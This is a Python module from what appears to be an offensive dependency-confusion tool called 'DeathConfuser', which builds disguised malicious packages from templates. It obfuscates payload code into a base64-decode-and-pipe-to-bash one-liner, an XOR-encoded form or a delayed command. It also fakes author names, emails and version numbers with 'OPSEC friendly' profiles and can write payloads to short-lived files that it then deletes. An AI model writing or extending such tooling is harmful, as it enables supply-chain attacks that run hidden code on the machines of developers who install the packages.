from __future__ import annotations

"""Utilities for rendering payload templates for different package ecosystems."""

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Optional
import base64
import random

from jinja2 import Environment, FileSystemLoader, select_autoescape

from ..core.logger import get_logger
from ..core import ml
from ..opsec import load_profiles, PROFILE_FILE
from ..utils.fs_utils import atomic_write, cleanup, temporary_directory

TEMPLATE_DIR = Path(__file__).parent / "templates"


@dataclass
class RenderedPayload:
    """Represents a rendered payload and optional on-disk location."""

    content: str
    path: Optional[Path] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


class PayloadBuilder:
    """Render payload templates with OPSEC friendly defaults."""

    def __init__(self, template_dir: Path = TEMPLATE_DIR, profiles: Optional[Path] = None) -> None:
        self.template_dir = template_dir
        self.env = Environment(
            loader=FileSystemLoader(str(template_dir)),
            autoescape=select_autoescape(disabled_extensions=(".j2",)),
            trim_blocks=True,
            lstrip_blocks=True,
        )
        self.log = get_logger(__name__)
        self.profiles = load_profiles(profiles or PROFILE_FILE)

    def list_templates(self) -> list[str]:
        """Return available template names."""
        return sorted(self.env.list_templates("*.j2"))

    def _random_profile(self) -> Dict[str, str]:
        if not self.profiles:
            return {"name": "Anonymous", "email": "anon@example.com"}
        return random.choice(self.profiles)

    def _obfuscate(self, code: str, method: Optional[str]) -> str:
        if not method:
            return code
        if method == "b64":
            encoded = base64.b64encode(code.encode()).decode()
            return f"bash -c \"echo {encoded} | base64 -d | bash\""
        if method == "xor":
            key = random.randint(1, 255)
            encoded = ",".join(str(ord(c) ^ key) for c in code)
            return (
                "python3 - <<'PY'\n"
                f"b=[{encoded}]\n"
                f"print(''.join(chr(x^{key}) for x in b))\n"
                "PY"
            )
        if method == "time":
            delay = random.randint(1, 5)
            return f"sleep {delay}; {code}"
        return code

    def render(
        self,
        template: str,
        payload_code: Optional[str] = None,
        obfuscate: Optional[str] = None,
        metadata: Optional[Dict[str, Any]] = None,
        *,
        return_meta: bool = False,
        **variables: Any,
    ) -> str | tuple[str, Dict[str, Any]]:
        """Render ``template`` with metadata and optional payload."""
        meta = metadata.copy() if metadata else {}
        profile = self._random_profile()
        meta.setdefault("author_name", profile.get("name"))
        meta.setdefault("author_email", profile.get("email"))
        meta.setdefault("description", "Generated by DeathConfuser")
        meta.setdefault("version", f"0.0.{random.randint(1,9)}")
        if payload_code:
            meta["payload_code"] = self._obfuscate(payload_code, obfuscate)
        meta.update(variables)
        tmpl = self.env.get_template(template)
        self.log.debug("Rendering template %s with %s", template, meta)
        rendered = tmpl.render(**meta)
        return (rendered, meta) if return_meta else rendered

    def build(
        self,
        template: str,
        output_dir: Optional[Path] = None,
        filename: Optional[str] = None,
        payload_code: Optional[str] = None,
        obfuscate: Optional[str] = None,
        metadata: Optional[Dict[str, Any]] = None,
        ephemeral: bool = False,
        stack: Optional[str] = None,
        **variables: Any,
    ) -> RenderedPayload:
        """Render template, optionally write to ``output_dir`` and return info."""
        if template == "auto" and stack:
            template = ml.select_payload_for_stack(stack)
        content, meta = self.render(
            template,
            payload_code=payload_code,
            obfuscate=obfuscate,
            metadata=metadata,
            return_meta=True,
            **variables,
        )
        path: Optional[Path] = None
        if output_dir:
            output_dir.mkdir(parents=True, exist_ok=True)
            if not filename:
                filename = Path(template).stem
            path = output_dir / filename
            atomic_write(path, content)
            self.log.debug("Wrote payload to %s", path)
            if ephemeral:
                cleanup(path)
                path = None
        elif ephemeral:
            with temporary_directory() as tmp:
                tmp_path = tmp / (filename or Path(template).stem)
                atomic_write(tmp_path, content)
                self.log.debug("Wrote ephemeral payload to %s", tmp_path)
                cleanup(tmp_path)
        return RenderedPayload(content=content, path=path, metadata=meta)
